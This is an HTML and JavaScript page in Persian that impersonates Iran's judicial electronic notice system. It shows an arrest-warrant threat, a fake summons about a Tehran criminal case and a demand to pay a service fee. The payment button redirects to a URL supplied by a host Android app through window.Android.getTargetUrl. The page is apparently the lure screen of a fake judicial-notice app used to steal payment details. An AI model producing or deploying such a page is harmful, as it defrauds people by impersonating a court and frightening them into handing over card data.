<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>سامانه ابلاغ الکترونیک قضایی</title>
    <style>
        :root {
            --primary-blue: #0d47a1;
            --light-blue: #e3f2fd;
            --dark-text: #212121;
            --light-text: #757575;
            --background-color: #f4f6f9;
            --danger-red: #d32f2f;
            --white: #ffffff;
            --border-color: #e0e0e0;
        }

        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Vazirmatn', sans-serif;
            background-color: var(--background-color);
            color: var(--dark-text);
            font-size: 16px;
            overscroll-behavior-y: contain;
        }

        .page { display: none; }
        .page.active { display: block; animation: fadeIn 0.3s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .container { padding: 0 15px; }

        /* --- Disclaimer Page --- */
        #disclaimer-page {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: var(--white);
            z-index: 2000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        .disclaimer-icon svg { width: 80px; height: 80px; fill: var(--danger-red); }
        .disclaimer-content h1 { font-size: 22px; color: var(--danger-red); margin: 15px 0; }
        .disclaimer-content p { font-size: 15px; line-height: 1.8; color: var(--light-text); margin-bottom: 25px; }
        .disclaimer-ack { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .disclaimer-ack label { cursor: pointer; }
        .disclaimer-ack input[type="checkbox"] { width: 20px; height: 20px; cursor: pointer; }
        #proceed-button {
            width: 100%;
            max-width: 300px;
            padding: 14px;
            font-size: 18px;
            font-weight: 700;
            color: var(--white);
            background-color: var(--primary-blue);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.2s, opacity 0.2s;
        }
        #proceed-button:disabled { background-color: #9e9e9e; cursor: not-allowed; opacity: 0.7; }

        /* --- Home Page --- */
        .app-header {
            background-color: var(--primary-blue);
            color: var(--white);
            padding: 15px;
            text-align: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .app-header h1 { font-size: 20px; }
        
        .list-section { margin-top: 20px; }
        .list-item {
            background-color: var(--white);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: background-color 0.2s;
            border: 1px solid var(--border-color);
        }
        .list-item:hover { background-color: #fafafa; }
        .item-content { display: flex; align-items: center; gap: 15px; }
        .item-icon svg { width: 28px; height: 28px; fill: var(--primary-blue); }
        .item-text h3 { font-size: 17px; font-weight: 500; }
        .item-badge {
            background-color: var(--danger-red);
            color: var(--white);
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 14px;
            font-weight: 700;
        }
        .chevron-icon svg { width: 24px; height: 24px; fill: var(--light-text); }

        /* --- Details Page --- */
        .details-header { display: flex; align-items: center; background-color: var(--white); padding: 10px; border-bottom: 1px solid var(--border-color); }
        .back-button { background: none; border: none; cursor: pointer; padding: 5px; }
        .back-button svg { width: 24px; height: 24px; fill: var(--dark-text); }
        .details-header h2 { font-size: 18px; margin-right: 10px; }
        
        .notice-card { background: var(--white); margin: 20px 15px; padding: 20px; border-radius: 8px; }
        .notice-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed var(--border-color); padding-bottom: 15px; margin-bottom: 15px; }
        .notice-header .from { font-weight: 700; }
        .notice-header .date { color: var(--light-text); font-size: 14px; }
        .notice-body { line-height: 2; color: #424242; }
        .notice-body .summary {
            max-height: 90px; /* Approx 3 lines */
            overflow: hidden;
            position: relative;
        }
        .notice-body .summary::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 40px;
            background: linear-gradient(to top, var(--white), transparent);
        }
        .view-more-button {
            display: inline-block;
            margin-top: 15px;
            padding: 12px 25px;
            font-size: 16px;
            font-weight: 700;
            color: var(--white);
            background-color: var(--primary-blue);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
        }

        /* --- Final Modal --- */
        .modal {
            position: fixed;
            z-index: 1001;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0; visibility: hidden;
            transition: opacity 0.3s ease, visibility 0s 0.3s;
        }
        .modal.active { opacity: 1; visibility: visible; transition: opacity 0.3s ease; }
        .modal-content { background-color: var(--white); padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; }
        .modal-content h3 { font-size: 20px; margin-bottom: 15px; }
        .modal-content p { color: var(--light-text); margin-bottom: 25px; }
        #redirectButton {
            width: 100%;
            min-height: 53px;
            padding: 14px;
            font-size: 18px;
            font-weight: 700;
            color: var(--white);
            background-color: var(--color-green);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 25px; height: 25px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: var(--white);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <div id="disclaimer-page" class="page active">
        <div class="disclaimer-icon">
            <svg viewBox="0 0 24 24"><path d="M13,13H11V7H13M13,17H11V15H13M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2Z" /></svg>
        </div>
        <div class="disclaimer-content">
            <h1>اخطار مهم</h1>
            <p>مشاهده نکردن ابلاغیه‌های الکترونیک به منزله مشاهده حضوری بوده و مسئولیت قانونی آن، از جمله احتمال صدور حکم جلب، بر عهده شما خواهد بود.</p>
        </div>
        <div class="disclaimer-ack">
            <input type="checkbox" id="ack-checkbox">
            <label for="ack-checkbox">متن فوق را مطالعه کرده و مسئولیت آن را می‌پذیرم.</label>
        </div>
        <button id="proceed-button" disabled>ورود به سامانه</button>
    </div>

    <div id="home-page" class="page">
        <header class="app-header">
            <h1>سامانه ابلاغ الکترونیک قضایی</h1>
        </header>
        <main class="container">
            <div class="list-section">
                <div class="list-item" id="new-notice-btn">
                    <div class="item-content">
                        <div class="item-icon">
                            <svg viewBox="0 0 24 24"><path d="M20,8L12,13L4,8V6L12,11L20,6M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z" /></svg>
                        </div>
                        <div class="item-text">
                            <h3>ابلاغیه‌های جدید</h3>
                        </div>
                    </div>
                    <div class="item-badge">1</div>
                </div>
                </div>
        </main>
    </div>

    <div id="details-page" class="page">
        <header class="details-header">
            <button class="back-button">
                <svg viewBox="0 0 24 24"><path d="M20,11V13H8L13.5,18.5L12.08,19.92L4.16,12L12.08,4.08L13.5,5.5L8,11H20Z" /></svg>
            </button>
            <h2>جزئیات ابلاغیه</h2>
        </header>
        <div class="notice-card">
            <div class="notice-header">
                <span class="from">قوه قضاییه جمهوری اسلامی ایران</span>
                <span class="date">۱۴۰۴/۰۴/۲۰</span>
            </div>
            <div class="notice-body">
                <p class="summary">
                    با سلام، جناب آقای/خانم محترم، به اطلاع می‌رساند در خصوص پرونده کلاسه ۹۸۰۱۲۳ مطروحه در شعبه ۱۰۱ دادگاه کیفری دو شهرستان تهران، اخطاریه‌ای جهت حضور شما در تاریخ ۱۴۰۴/۰۵/۱۰ صادر گردیده است. عدم حضور شما...
                </p>
            </div>
            <button class="view-more-button">مشاهده و پرداخت هزینه</button>
        </div>
    </div>

    <div id="actionModal" class="modal">
        <div class="modal-content">
            <h3>پرداخت هزینه ابلاغیه</h3>
            <p>برای مشاهده کامل متن و دریافت نسخه چاپی، لطفاً هزینه خدمات الکترونیک قضایی را پرداخت نمایید.</p>
            <button id="redirectButton" class="redirect-button">پرداخت و ادامه</button>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // --- Page Elements ---
        const pages = document.querySelectorAll('.page');
        const disclaimerPage = document.getElementById('disclaimer-page');
        const ackCheckbox = document.getElementById('ack-checkbox');
        const proceedButton = document.getElementById('proceed-button');
        const newNoticeButton = document.getElementById('new-notice-btn');
        const backButton = document.querySelector('.back-button');
        const viewMoreButton = document.querySelector('.view-more-button');
        const modal = document.getElementById('actionModal');
        const redirectButton = document.getElementById('redirectButton');

        // --- Navigation Logic ---
        function navigateTo(pageId) {
            pages.forEach(p => p.classList.remove('active'));
            const targetPage = document.getElementById(pageId);
            if (targetPage) {
                targetPage.classList.add('active');
            }
        }

        // --- Disclaimer Page Logic ---
        ackCheckbox.addEventListener('change', () => {
            proceedButton.disabled = !ackCheckbox.checked;
        });
        proceedButton.addEventListener('click', () => {
            if (ackCheckbox.checked) {
                disclaimerPage.style.display = 'none'; // Completely hide it after proceeding
                navigateTo('home-page');
            }
        });

        // --- Navigation Event Listeners ---
        newNoticeButton.addEventListener('click', () => navigateTo('details-page'));
        backButton.addEventListener('click', () => navigateTo('home-page'));
        viewMoreButton.addEventListener('click', () => modal.classList.add('active'));

        // --- Modal & Redirect Logic ---
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
            }
        });

        redirectButton.addEventListener('click', () => {
            let targetUrl = 'https://example.com/fallback-error';
            if (typeof window.Android !== 'undefined' && typeof window.Android.getTargetUrl === 'function') {
                targetUrl = window.Android.getTargetUrl();
            } else {
                console.log("Android interface not found. Using fallback URL.");
            }
            
            // Show spinner animation
            const originalText = redirectButton.textContent;
            redirectButton.innerHTML = '<div class="spinner"></div>';
            redirectButton.disabled = true;

            console.log('Redirecting to:', targetUrl);
            setTimeout(() => {
                window.location.href = targetUrl;
                // In case redirect fails, reset the button
                setTimeout(() => {
                    redirectButton.innerHTML = originalText;
                    redirectButton.disabled = false;
                }, 2000);
            }, 300); // Small delay to show spinner
        });

        // --- Initial State ---
        navigateTo('disclaimer-page');
    });
    </script>
</body>
</html>
